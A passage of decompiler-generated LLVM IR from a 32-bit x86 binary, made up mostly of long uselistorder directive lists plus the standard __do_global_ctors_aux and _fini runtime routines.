  uselistorder i32* @ecx, { 33, 5, 7, 32, 6, 91, 156, 157, 14, 158, 159, 160, 161, 15, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 67, 74, 68, 69, 70, 71, 72, 73, 178, 179, 180, 8, 92, 276, 297, 86, 94, 95, 96, 97, 98, 9, 138, 1, 75, 76, 77, 78, 80, 81, 82, 83, 84, 85, 79, 181, 16, 10, 275, 279, 280, 281, 282, 287, 288, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 12, 19, 182, 183, 17, 11, 18, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 289, 290, 291, 104, 105, 13, 34, 277, 292, 35, 87, 88, 89, 90, 93, 312, 311, 99, 100, 101, 102, 310, 103, 293, 294, 295, 52, 53, 54, 20, 55, 56, 296, 2, 139, 283, 284, 39, 40, 41, 285, 209, 210, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 36, 246, 247, 286, 248, 37, 249, 31, 143, 342, 149, 21, 152, 153, 154, 155, 106, 107, 216, 217, 108, 109, 110, 111, 112, 151, 218, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 22, 360, 346, 347, 339, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 23, 332, 333, 335, 336, 337, 338, 334, 380, 150, 194, 195, 196, 197, 198, 199, 200, 202, 0, 42, 24, 201, 43, 44, 203, 211, 250, 251, 252, 253, 254, 255, 256, 38, 257, 258, 259, 260, 261, 262, 25, 26, 3, 4, 263, 264, 27, 265, 266, 267, 268, 269, 271, 272, 273, 274, 57, 58, 270, 343, 212, 144, 145, 371, 372, 381, 205, 208, 113, 115, 114, 116, 118, 117, 386, 373, 119, 120, 278, 344, 387, 388, 124, 125, 341, 382, 121, 219, 122, 374, 345, 340, 123, 59, 126, 389, 127, 128, 206, 60, 61, 62, 63, 64, 146, 207, 65, 378, 28, 379, 384, 385, 383, 375, 376, 377, 30, 29, 129, 130, 131, 132, 133, 134, 135, 50, 51, 136, 137, 66, 140, 141, 142, 147, 45, 148, 204, 46, 47, 213, 214, 48, 215, 220, 49 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a67d, { 1, 0 }
  uselistorder label %dec_label_pc_805a679, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805a65d, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805a69c = load i32, i32* @global_var_805e56c.369, align 4
  %v10_805a6a1 = icmp eq i32 %v0_805a69c, -1
  br i1 %v10_805a6a1, label %dec_label_pc_805a6bc, label %dec_label_pc_805a6b0.preheader

dec_label_pc_805a6b0.preheader:                   ; preds = %entry
  br label %dec_label_pc_805a6b0

dec_label_pc_805a6b0:                             ; preds = %dec_label_pc_805a6b0.preheader, %dec_label_pc_805a6b0
  %v4_805a6b3 = phi i32 [ %v0_805a69c, %dec_label_pc_805a6b0.preheader ], [ %v2_805a6b5, %dec_label_pc_805a6b0 ]
  %v0_805a6b0 = phi i32 [ ptrtoint (i32* @global_var_805e56c.369 to i32), %dec_label_pc_805a6b0.preheader ], [ %v1_805a6b0, %dec_label_pc_805a6b0 ]
  %v1_805a6b0 = add i32 %v0_805a6b0, -4
  call void @__pseudo_call(i32 %v4_805a6b3)
  %v1_805a6b5 = inttoptr i32 %v1_805a6b0 to i32*
  %v2_805a6b5 = load i32, i32* %v1_805a6b5, align 4
  %v10_805a6b7 = icmp eq i32 %v2_805a6b5, -1
  %v1_805a6ba = icmp eq i1 %v10_805a6b7, false
  br i1 %v1_805a6ba, label %dec_label_pc_805a6b0, label %dec_label_pc_805a6bc.loopexit

dec_label_pc_805a6bc.loopexit:                    ; preds = %dec_label_pc_805a6b0
  %v2_805a6bc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805a6bc

dec_label_pc_805a6bc:                             ; preds = %dec_label_pc_805a6bc.loopexit, %entry
  %v2_805a6bc = phi i32 [ %v2_805a6bc.pre, %dec_label_pc_805a6bc.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_805a6bc

; uselistorder directives
  uselistorder i32 %v0_805a69c, { 1, 0 }
  uselistorder i1 false, { 629, 478, 10, 6, 7, 12, 479, 480, 482, 481, 11, 484, 483, 170, 221, 220, 485, 726, 727, 494, 53, 54, 489, 493, 491, 492, 69, 486, 487, 490, 495, 496, 497, 498, 499, 171, 173, 174, 175, 176, 172, 177, 178, 181, 64, 179, 65, 180, 500, 501, 506, 55, 502, 503, 505, 504, 507, 508, 513, 512, 509, 510, 511, 13, 0, 200, 201, 202, 14, 203, 204, 205, 206, 224, 771, 769, 770, 70, 766, 767, 768, 772, 773, 728, 729, 15, 730, 731, 207, 737, 738, 225, 226, 227, 228, 16, 350, 351, 352, 71, 183, 182, 73, 184, 185, 186, 187, 188, 190, 189, 72, 514, 515, 516, 757, 724, 725, 589, 590, 591, 739, 740, 741, 592, 56, 593, 742, 743, 744, 774, 775, 18, 192, 191, 17, 776, 777, 778, 779, 780, 781, 782, 783, 784, 252, 522, 57, 19, 517, 518, 519, 520, 521, 523, 524, 58, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 540, 539, 733, 734, 735, 736, 193, 208, 209, 210, 211, 212, 236, 235, 20, 732, 194, 195, 196, 197, 198, 199, 758, 759, 213, 214, 215, 216, 217, 218, 219, 222, 788, 785, 223, 229, 230, 232, 231, 74, 233, 787, 786, 75, 234, 237, 238, 760, 239, 240, 241, 242, 761, 142, 143, 144, 145, 147, 146, 76, 148, 149, 150, 151, 152, 153, 21, 59, 22, 154, 155, 157, 156, 158, 762, 763, 764, 765, 243, 246, 244, 245, 247, 248, 249, 250, 23, 353, 354, 355, 356, 745, 746, 747, 541, 542, 594, 595, 596, 630, 631, 632, 633, 634, 635, 636, 93, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 748, 749, 750, 751, 752, 753, 754, 755, 820, 821, 66, 5, 655, 77, 108, 656, 657, 822, 823, 824, 392, 251, 807, 819, 896, 897, 898, 899, 903, 78, 904, 905, 902, 895, 825, 129, 435, 436, 437, 439, 440, 441, 393, 394, 109, 455, 456, 457, 458, 459, 460, 24, 253, 254, 67, 446, 25, 618, 619, 255, 831, 832, 835, 836, 880, 881, 882, 847, 848, 849, 850, 851, 852, 841, 842, 843, 844, 845, 846, 840, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 51, 800, 799, 804, 801, 802, 803, 26, 805, 806, 438, 299, 883, 321, 543, 544, 546, 547, 466, 8, 9, 469, 468, 467, 27, 900, 488, 658, 659, 79, 660, 28, 545, 548, 756, 549, 550, 551, 552, 553, 554, 555, 599, 597, 598, 29, 60, 600, 602, 601, 80, 603, 605, 604, 81, 606, 556, 557, 607, 395, 94, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 681, 680, 682, 683, 684, 685, 686, 688, 52, 689, 687, 690, 692, 691, 30, 693, 694, 696, 695, 82, 697, 698, 699, 700, 701, 110, 702, 703, 118, 119, 704, 120, 121, 705, 706, 122, 707, 708, 111, 123, 709, 710, 711, 712, 713, 112, 714, 113, 124, 114, 715, 115, 716, 717, 718, 116, 719, 117, 720, 125, 721, 722, 723, 159, 160, 826, 83, 830, 31, 608, 609, 610, 611, 612, 613, 396, 84, 397, 398, 399, 400, 401, 402, 614, 256, 257, 258, 259, 260, 261, 262, 263, 264, 303, 68, 265, 266, 267, 268, 269, 853, 854, 855, 270, 271, 809, 817, 818, 885, 272, 273, 274, 827, 828, 829, 875, 879, 886, 622, 95, 96, 623, 32, 275, 856, 857, 860, 861, 862, 863, 864, 161, 866, 858, 859, 810, 811, 812, 33, 815, 276, 34, 277, 278, 279, 282, 283, 816, 808, 85, 813, 814, 281, 280, 1, 284, 867, 300, 839, 2, 865, 86, 868, 285, 286, 287, 288, 162, 163, 164, 165, 289, 290, 291, 304, 305, 306, 307, 308, 311, 309, 87, 310, 292, 293, 837, 887, 322, 323, 324, 294, 97, 295, 296, 297, 99, 100, 876, 877, 88, 878, 98, 888, 35, 889, 101, 891, 892, 893, 102, 894, 103, 884, 890, 869, 36, 874, 104, 871, 870, 37, 872, 38, 105, 873, 298, 838, 301, 833, 61, 834, 166, 167, 302, 312, 313, 314, 315, 316, 317, 318, 319, 320, 39, 325, 326, 327, 328, 331, 334, 335, 336, 332, 333, 330, 329, 624, 625, 89, 337, 90, 338, 130, 41, 131, 40, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 339, 345, 346, 3, 62, 344, 343, 4, 340, 341, 91, 342, 42, 168, 347, 50, 348, 349, 901, 365, 357, 43, 358, 359, 360, 361, 362, 363, 364, 106, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 403, 404, 405, 409, 410, 406, 407, 408, 45, 46, 412, 411, 413, 414, 44, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 442, 63, 443, 444, 445, 447, 448, 449, 450, 451, 452, 453, 454, 461, 462, 463, 464, 465, 470, 471, 472, 473, 474, 475, 476, 477, 558, 559, 560, 126, 48, 561, 562, 563, 564, 565, 566, 127, 47, 567, 568, 569, 128, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 49, 581, 582, 583, 584, 585, 107, 586, 587, 588, 615, 616, 617, 620, 621, 626, 627, 628, 906, 169, 92, 907, 908, 909 }
  uselistorder void (i32)* @__pseudo_call, { 54, 32, 29, 13, 33, 34, 56, 57, 58, 59, 0, 14, 60, 61, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 62, 63, 27, 28, 30, 31, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 64, 65, 66, 1, 2, 3, 4, 5, 6, 7, 8, 67, 46, 47, 68, 55, 71, 72, 73, 74, 75, 50, 77, 48, 70, 49, 76, 69, 78, 9, 10, 53, 11, 51, 52, 12 }
  uselistorder i32 -4, { 20, 85, 21, 22, 23, 86, 24, 25, 26, 87, 88, 27, 103, 7, 104, 105, 106, 15, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 89, 90, 8, 0, 41, 42, 43, 44, 9, 45, 10, 46, 47, 48, 49, 50, 51, 52, 53, 11, 12, 13, 54, 55, 101, 102, 56, 57, 14, 100, 58, 91, 92, 93, 94, 116, 118, 119, 120, 16, 117, 3, 115, 1, 2, 5, 6, 107, 108, 109, 110, 111, 112, 113, 17, 96, 98, 99, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 114, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 84, 82, 83, 95, 4, 18, 19, 97 }
  uselistorder i32 -1, { 0, 1, 109, 100, 227, 272, 273, 451, 452, 110, 111, 274, 112, 2, 3, 223, 440, 275, 4, 5, 6, 115, 114, 113, 276, 196, 197, 91, 90, 89, 277, 278, 116, 279, 228, 260, 229, 261, 83, 84, 85, 280, 281, 75, 282, 283, 284, 285, 453, 286, 454, 455, 287, 456, 288, 230, 117, 289, 477, 290, 291, 292, 118, 293, 294, 295, 119, 7, 296, 231, 297, 8, 298, 457, 458, 10, 11, 459, 460, 299, 214, 208, 210, 211, 212, 213, 209, 76, 207, 198, 300, 206, 215, 216, 205, 217, 218, 219, 220, 221, 199, 200, 204, 9, 120, 12, 13, 441, 77, 442, 443, 301, 121, 302, 303, 262, 304, 305, 14, 15, 478, 479, 306, 307, 16, 444, 17, 445, 309, 308, 107, 78, 310, 311, 461, 462, 18, 87, 122, 312, 103, 313, 472, 314, 201, 123, 124, 315, 125, 316, 232, 317, 318, 104, 319, 222, 320, 99, 321, 322, 323, 127, 126, 324, 325, 19, 101, 326, 128, 129, 130, 131, 327, 132, 328, 133, 329, 134, 330, 135, 331, 136, 332, 137, 333, 20, 21, 334, 108, 138, 139, 335, 336, 337, 338, 339, 140, 340, 341, 142, 141, 233, 143, 22, 144, 342, 145, 343, 92, 344, 146, 345, 346, 483, 347, 348, 23, 484, 480, 26, 25, 27, 28, 29, 147, 30, 148, 31, 349, 24, 481, 79, 350, 351, 352, 32, 33, 34, 463, 466, 149, 353, 150, 473, 354, 355, 464, 465, 356, 467, 468, 485, 151, 234, 357, 358, 93, 359, 360, 361, 102, 362, 82, 474, 475, 86, 363, 364, 476, 365, 152, 366, 367, 368, 263, 264, 369, 235, 80, 202, 203, 153, 236, 469, 154, 370, 155, 371, 237, 156, 372, 157, 373, 105, 106, 374, 158, 375, 159, 376, 160, 377, 161, 378, 162, 379, 163, 380, 164, 381, 165, 382, 166, 383, 167, 35, 36, 37, 38, 384, 39, 40, 41, 42, 43, 168, 385, 169, 386, 170, 387, 171, 388, 172, 389, 173, 390, 174, 391, 175, 392, 176, 393, 177, 394, 178, 395, 179, 396, 180, 397, 181, 398, 182, 399, 183, 400, 184, 401, 185, 402, 186, 403, 187, 404, 188, 405, 189, 406, 44, 407, 408, 409, 410, 411, 45, 46, 238, 265, 47, 412, 239, 266, 413, 240, 267, 94, 241, 268, 242, 269, 243, 244, 446, 48, 49, 50, 245, 51, 190, 191, 52, 53, 54, 55, 470, 471, 56, 57, 448, 192, 447, 414, 95, 58, 193, 59, 194, 482, 60, 415, 195, 61, 224, 246, 270, 416, 98, 248, 271, 247, 417, 225, 226, 418, 419, 420, 62, 63, 421, 64, 65, 422, 437, 438, 439, 97, 423, 249, 424, 449, 425, 66, 450, 251, 250, 426, 252, 253, 427, 428, 67, 68, 69, 254, 255, 256, 70, 429, 71, 430, 431, 81, 96, 432, 72, 73, 74, 88, 433, 434, 435, 436, 257, 258, 259 }
  uselistorder i32* @global_var_805e56c.369, { 1, 0 }
  uselistorder i32 1, { 748, 1556, 462, 1377, 1557, 455, 1558, 222, 1559, 487, 1560, 1561, 211, 1454, 1390, 1373, 751, 750, 749, 203, 1414, 753, 752, 329, 755, 754, 1455, 486, 1562, 756, 99, 98, 97, 488, 489, 1563, 463, 456, 1566, 675, 1567, 1568, 1569, 612, 1570, 0, 728, 164, 163, 1571, 1572, 758, 757, 382, 381, 383, 1573, 759, 1574, 760, 384, 1575, 1576, 761, 386, 385, 387, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 765, 764, 763, 730, 762, 729, 155, 154, 153, 156, 1424, 1425, 768, 767, 766, 731, 732, 348, 344, 346, 343, 345, 347, 543, 1577, 1578, 446, 1579, 1580, 490, 1581, 613, 1582, 1583, 769, 183, 544, 1587, 1584, 1585, 1586, 464, 772, 771, 770, 336, 335, 545, 1439, 447, 448, 1440, 465, 1, 773, 176, 175, 2, 1426, 774, 275, 273, 274, 776, 775, 779, 778, 777, 224, 686, 3, 614, 687, 676, 783, 782, 781, 780, 1714, 784, 230, 231, 229, 232, 785, 786, 388, 4, 484, 1457, 1489, 1490, 1491, 491, 1492, 1427, 1428, 1429, 474, 1432, 475, 1433, 1434, 1430, 1431, 788, 787, 1588, 1589, 1590, 789, 390, 389, 391, 615, 1591, 618, 790, 546, 791, 146, 1647, 792, 205, 492, 493, 160, 161, 162, 494, 793, 166, 547, 5, 795, 794, 92, 796, 212, 797, 197, 619, 1721, 1722, 1727, 799, 798, 800, 228, 801, 620, 548, 1723, 1724, 1725, 1726, 804, 803, 802, 216, 215, 217, 495, 808, 807, 806, 805, 189, 621, 809, 449, 1592, 1593, 457, 1594, 496, 466, 1595, 1597, 1598, 1599, 1600, 1601, 1602, 497, 812, 811, 810, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 6, 1611, 498, 1612, 1613, 1614, 499, 1615, 1616, 500, 1617, 1618, 1619, 1620, 1621, 622, 746, 814, 813, 289, 290, 549, 550, 1622, 1623, 1624, 1625, 467, 1401, 243, 244, 1402, 181, 182, 1403, 171, 172, 1404, 173, 174, 1405, 114, 115, 1406, 291, 292, 815, 188, 187, 186, 551, 816, 207, 208, 206, 157, 552, 1715, 1716, 7, 817, 159, 158, 553, 1441, 1442, 1443, 8, 818, 91, 819, 77, 76, 476, 477, 478, 479, 480, 9, 820, 332, 333, 554, 555, 10, 821, 75, 556, 733, 170, 557, 822, 734, 327, 328, 558, 559, 1435, 1436, 11, 823, 79, 78, 1437, 12, 501, 825, 824, 394, 392, 395, 393, 1438, 13, 502, 827, 826, 398, 396, 399, 397, 560, 561, 14, 828, 100, 562, 563, 15, 829, 233, 16, 400, 17, 830, 564, 565, 1444, 1445, 1446, 566, 832, 831, 301, 305, 304, 303, 302, 834, 833, 401, 1447, 1448, 1449, 837, 836, 835, 177, 178, 1450, 1451, 838, 1452, 1453, 839, 567, 1456, 841, 840, 196, 843, 842, 844, 568, 688, 569, 570, 1458, 846, 845, 192, 193, 194, 847, 190, 849, 848, 851, 850, 852, 854, 853, 856, 855, 858, 857, 860, 859, 571, 862, 861, 863, 18, 19, 864, 110, 111, 112, 113, 1459, 20, 1374, 403, 404, 402, 355, 866, 865, 735, 310, 623, 870, 869, 868, 867, 503, 1407, 1408, 504, 1409, 1410, 1411, 1412, 885, 884, 883, 882, 881, 880, 879, 878, 877, 736, 876, 875, 874, 873, 872, 871, 278, 276, 277, 1720, 886, 887, 892, 891, 890, 889, 888, 283, 284, 572, 573, 1392, 1391, 1393, 624, 893, 285, 286, 287, 288, 1460, 900, 899, 898, 897, 896, 895, 894, 330, 902, 901, 1493, 1494, 1495, 903, 195, 904, 1717, 905, 294, 295, 574, 1648, 737, 405, 626, 1672, 1673, 1674, 505, 625, 906, 1675, 1676, 1677, 506, 1678, 1679, 918, 917, 916, 915, 914, 913, 912, 911, 910, 909, 908, 907, 415, 414, 411, 407, 412, 406, 408, 410, 409, 413, 1680, 1681, 21, 65, 64, 63, 62, 61, 919, 416, 417, 920, 105, 104, 1718, 1719, 921, 220, 219, 221, 1755, 1756, 1757, 922, 319, 317, 318, 923, 1682, 924, 314, 313, 316, 311, 312, 315, 575, 576, 927, 926, 925, 928, 418, 929, 419, 930, 420, 931, 933, 932, 109, 934, 300, 935, 237, 937, 936, 334, 938, 939, 227, 1758, 1759, 1760, 942, 941, 940, 149, 151, 150, 152, 1786, 577, 944, 943, 946, 945, 421, 578, 689, 1375, 22, 954, 953, 952, 951, 950, 949, 948, 947, 184, 185, 1520, 957, 956, 955, 299, 297, 298, 235, 627, 958, 1544, 1545, 1546, 1547, 959, 144, 143, 145, 141, 142, 579, 580, 690, 481, 691, 692, 482, 693, 960, 961, 139, 140, 1538, 1378, 458, 1539, 694, 1540, 738, 962, 124, 123, 122, 125, 963, 131, 129, 128, 133, 132, 130, 137, 135, 138, 134, 136, 628, 965, 964, 629, 966, 630, 967, 631, 970, 969, 968, 695, 973, 972, 971, 422, 632, 1771, 1772, 1773, 974, 179, 180, 1766, 1767, 468, 1768, 1769, 1770, 127, 126, 696, 1765, 507, 425, 426, 428, 427, 633, 975, 121, 634, 1728, 1729, 1730, 1731, 1732, 1733, 1734, 1735, 1736, 508, 1737, 1738, 1739, 1740, 1741, 583, 1742, 1743, 445, 584, 1744, 1745, 1746, 1747, 581, 582, 1748, 1749, 1750, 978, 977, 976, 264, 266, 263, 265, 267, 979, 585, 586, 980, 587, 588, 589, 509, 510, 511, 697, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 1626, 23, 1627, 635, 485, 636, 1631, 24, 997, 996, 995, 994, 993, 89, 90, 998, 999, 1549, 1550, 1551, 469, 590, 1552, 1002, 1001, 1000, 83, 591, 1003, 1596, 1004, 82, 1564, 1565, 1683, 1684, 747, 1005, 369, 1685, 1628, 1629, 1630, 1007, 1006, 60, 59, 1632, 1633, 1009, 1008, 262, 261, 260, 1788, 1010, 325, 324, 326, 1011, 1012, 592, 1634, 1635, 1636, 739, 107, 106, 1649, 1650, 1651, 512, 167, 637, 638, 639, 1652, 1013, 640, 641, 1653, 513, 25, 1015, 1014, 429, 642, 1637, 1638, 1016, 94, 93, 643, 1017, 593, 1018, 1686, 1687, 1379, 515, 1688, 1689, 1690, 1691, 1692, 1694, 1695, 1696, 516, 1697, 1698, 698, 514, 1699, 517, 1700, 1701, 1702, 1693, 1022, 1021, 1020, 1019, 71, 73, 72, 68, 69, 70, 74, 1703, 1023, 282, 279, 281, 280, 518, 1024, 1704, 1705, 1026, 1025, 66, 67, 1706, 1707, 1380, 1381, 594, 1708, 595, 1709, 1710, 1711, 519, 1712, 644, 1713, 1029, 1028, 1027, 360, 364, 362, 361, 363, 520, 645, 26, 646, 1030, 1031, 250, 249, 1761, 1033, 1032, 430, 596, 1787, 1034, 431, 647, 1035, 648, 1036, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1041, 1040, 1039, 1038, 1037, 370, 649, 521, 650, 727, 651, 616, 681, 1046, 1045, 740, 1044, 1043, 1042, 201, 202, 652, 1050, 1049, 1048, 1047, 1053, 1052, 1051, 1054, 653, 1663, 1664, 654, 655, 1665, 1056, 1055, 1058, 1057, 213, 1059, 380, 1060, 293, 1062, 1061, 165, 1063, 95, 1064, 96, 1065, 245, 1067, 1066, 331, 1069, 1068, 209, 1070, 337, 1071, 238, 1072, 236, 1073, 272, 1074, 223, 677, 27, 597, 1075, 678, 28, 1461, 1462, 598, 1076, 339, 1078, 1077, 432, 1080, 1079, 349, 1081, 433, 87, 1082, 204, 1084, 1083, 372, 1085, 271, 1086, 354, 599, 600, 601, 1088, 1087, 191, 1090, 1089, 341, 1091, 340, 1092, 246, 1093, 371, 1094, 239, 1095, 356, 1096, 434, 1097, 240, 1098, 435, 1100, 1099, 226, 1101, 80, 1102, 358, 252, 1103, 1104, 81, 1107, 1106, 1105, 352, 1111, 1110, 1109, 1108, 210, 1463, 1464, 1112, 88, 1113, 225, 1774, 602, 1775, 1776, 1777, 1114, 436, 359, 1115, 1117, 1116, 308, 309, 307, 306, 1118, 1751, 1752, 29, 30, 31, 1119, 1781, 1120, 1465, 1121, 1763, 1122, 234, 603, 522, 1125, 1124, 1123, 32, 33, 679, 259, 258, 699, 1762, 1127, 1126, 350, 351, 700, 1764, 1129, 1128, 253, 254, 656, 1130, 437, 1132, 1131, 1778, 1137, 1136, 1135, 1134, 1133, 1138, 1140, 1139, 1141, 1142, 1753, 1754, 1146, 1145, 1144, 1143, 1466, 1468, 1150, 1149, 1148, 1147, 1151, 1152, 34, 35, 320, 1467, 1153, 438, 241, 1155, 1154, 102, 101, 103, 1157, 1156, 199, 198, 200, 1158, 1161, 1160, 1159, 119, 120, 1163, 1162, 117, 116, 1164, 118, 1166, 1165, 147, 148, 1167, 373, 375, 374, 376, 1170, 1169, 1168, 338, 1469, 1172, 1171, 168, 169, 1470, 214, 36, 377, 37, 38, 39, 40, 1173, 604, 657, 1176, 1175, 1174, 357, 1179, 1178, 1177, 523, 1477, 1182, 1181, 1180, 41, 701, 524, 610, 1187, 1186, 1185, 1184, 1183, 251, 525, 1189, 1188, 1190, 1192, 1191, 1193, 1194, 1196, 1195, 702, 483, 1480, 1202, 1201, 1200, 1199, 1198, 1197, 353, 1382, 1204, 1203, 1205, 442, 1206, 1207, 1208, 1209, 1211, 1210, 1212, 1213, 443, 1214, 1215, 1216, 1217, 1218, 444, 1219, 1220, 1221, 1223, 1222, 1225, 1224, 1227, 1226, 1229, 1228, 1231, 1230, 1232, 1233, 1234, 1235, 1237, 1236, 605, 606, 1471, 1472, 1473, 1474, 1239, 1238, 86, 611, 526, 1240, 366, 365, 1782, 1783, 1784, 703, 1785, 270, 269, 268, 607, 1780, 1242, 1241, 322, 321, 1243, 42, 43, 44, 45, 1245, 1244, 323, 704, 1779, 470, 1246, 1247, 439, 527, 46, 1249, 1248, 1251, 1250, 1252, 658, 1475, 47, 48, 1476, 1256, 1255, 1254, 1253, 528, 49, 50, 529, 1257, 1260, 1259, 1258, 367, 368, 1261, 248, 247, 1262, 1478, 1265, 1264, 1263, 1479, 530, 1268, 1267, 1266, 1482, 531, 1271, 1270, 1269, 1272, 108, 1273, 242, 1274, 1481, 1275, 440, 705, 706, 659, 1277, 1276, 1278, 441, 1279, 342, 1483, 671, 670, 1394, 608, 663, 664, 665, 666, 667, 662, 668, 1395, 669, 1396, 1397, 660, 1398, 661, 1399, 1400, 1376, 672, 51, 1485, 1486, 532, 1283, 1282, 1281, 1280, 255, 256, 257, 533, 1484, 1285, 1284, 424, 423, 1286, 1287, 1413, 535, 534, 1290, 1289, 1288, 218, 1291, 1487, 1488, 473, 1293, 1292, 673, 707, 1294, 1297, 1296, 1295, 1496, 1497, 1498, 1499, 1500, 1501, 537, 1502, 1503, 1504, 609, 536, 709, 538, 1505, 1506, 708, 1507, 1304, 1303, 1302, 1301, 1300, 1299, 1298, 741, 710, 1305, 711, 712, 713, 714, 1306, 1311, 1310, 1309, 1308, 1307, 1508, 1509, 1312, 1510, 459, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 742, 1313, 1314, 450, 1521, 451, 460, 461, 1522, 1523, 1524, 1525, 452, 1526, 1527, 1528, 1529, 1530, 715, 1383, 1384, 1531, 1532, 1533, 1534, 1317, 1316, 1315, 84, 85, 1318, 1535, 1319, 1320, 1536, 716, 539, 1537, 1321, 717, 1322, 1325, 1324, 1323, 1541, 718, 1326, 719, 1327, 1334, 743, 1333, 1332, 1331, 1330, 1329, 1328, 1542, 1543, 720, 721, 1385, 1342, 1341, 744, 1340, 1339, 1338, 1337, 1336, 1335, 1548, 674, 722, 1386, 723, 1347, 1346, 1345, 1344, 1343, 1348, 1553, 453, 454, 1554, 1555, 52, 1350, 1349, 296, 53, 54, 55, 1351, 56, 1639, 1640, 540, 472, 1641, 1642, 1643, 1387, 541, 471, 1644, 1645, 1388, 724, 1356, 1355, 1354, 1353, 1352, 378, 379, 617, 1357, 542, 1646, 1389, 725, 726, 1364, 1363, 1362, 1361, 1360, 1359, 1358, 1666, 1667, 1668, 1366, 1365, 745, 1669, 57, 680, 1670, 58, 1671, 1368, 1367, 682, 1789, 1790, 683, 1791, 1792, 684, 685, 1793, 1794, 1369, 1371, 1370, 1372 }
  uselistorder label %dec_label_pc_805a6b0, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_805a6c7 = load i32, i32* @ebx, align 4
  %v1_805a6c8 = call i32 @__get_pc_thunk_bx(i32 %v0_805a6c7)
  store i32 %v1_805a6c8, i32* @eax, align 4
  %v0_805a6d3 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_805a6d3

; uselistorder directives
  uselistorder i32* @eax, { 29, 27, 13, 1, 34, 57, 30, 58, 31, 174, 3, 175, 176, 2, 177, 0, 37, 178, 38, 179, 59, 60, 62, 32, 61, 180, 185, 181, 182, 183, 184, 74, 63, 79, 216, 215, 75, 76, 15, 16, 7, 64, 65, 66, 68, 69, 70, 71, 72, 67, 8, 217, 39, 186, 40, 187, 188, 189, 190, 41, 42, 191, 17, 210, 77, 73, 33, 78, 80, 219, 218, 81, 82, 83, 84, 211, 212, 213, 85, 86, 87, 49, 214, 18, 88, 36, 235, 236, 276, 44, 277, 9, 275, 19, 89, 245, 244, 220, 222, 221, 166, 167, 168, 169, 170, 10, 203, 205, 204, 206, 207, 209, 50, 208, 195, 164, 90, 92, 91, 93, 95, 94, 26, 123, 246, 96, 98, 97, 268, 274, 99, 100, 237, 239, 240, 242, 238, 241, 101, 247, 248, 249, 252, 253, 255, 256, 257, 254, 51, 250, 251, 20, 21, 22, 102, 103, 226, 227, 229, 4, 230, 231, 234, 104, 105, 106, 107, 109, 110, 111, 112, 113, 228, 52, 53, 223, 224, 225, 232, 233, 108, 114, 115, 116, 117, 35, 124, 119, 11, 118, 23, 120, 121, 122, 266, 270, 272, 5, 273, 267, 271, 258, 259, 263, 265, 269, 261, 262, 260, 264, 243, 24, 125, 126, 127, 128, 6, 129, 130, 131, 132, 134, 136, 137, 138, 141, 142, 133, 54, 55, 143, 139, 140, 135, 144, 145, 146, 197, 198, 200, 199, 147, 148, 14, 45, 46, 47, 28, 48, 158, 149, 151, 154, 155, 156, 150, 152, 153, 56, 157, 43, 159, 160, 161, 162, 163, 165, 171, 172, 173, 192, 193, 194, 196, 278, 201, 202, 12, 25 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1557, 59, 60, 61, 189, 108, 874, 1558, 1561, 1559, 1560, 875, 210, 566, 567, 568, 569, 570, 571, 1065, 173, 109, 110, 845, 201, 876, 211, 1140, 1220, 111, 0, 877, 539, 1572, 1564, 1566, 1567, 65, 92, 1568, 1569, 1570, 878, 1571, 202, 203, 204, 1562, 1563, 212, 1573, 1574, 1576, 1577, 1575, 1578, 460, 1579, 1580, 1581, 1582, 1583, 1584, 214, 215, 879, 572, 573, 1141, 880, 1142, 213, 1143, 1144, 1145, 1146, 1147, 1148, 114, 115, 1149, 1150, 1151, 849, 1152, 113, 881, 112, 882, 216, 217, 883, 62, 884, 1153, 63, 885, 218, 574, 886, 887, 219, 888, 1587, 889, 1585, 444, 1586, 575, 576, 220, 221, 93, 890, 1588, 1589, 1590, 1591, 1592, 577, 891, 892, 222, 893, 1185, 1186, 66, 96, 894, 461, 895, 1187, 1188, 1189, 1190, 1154, 97, 896, 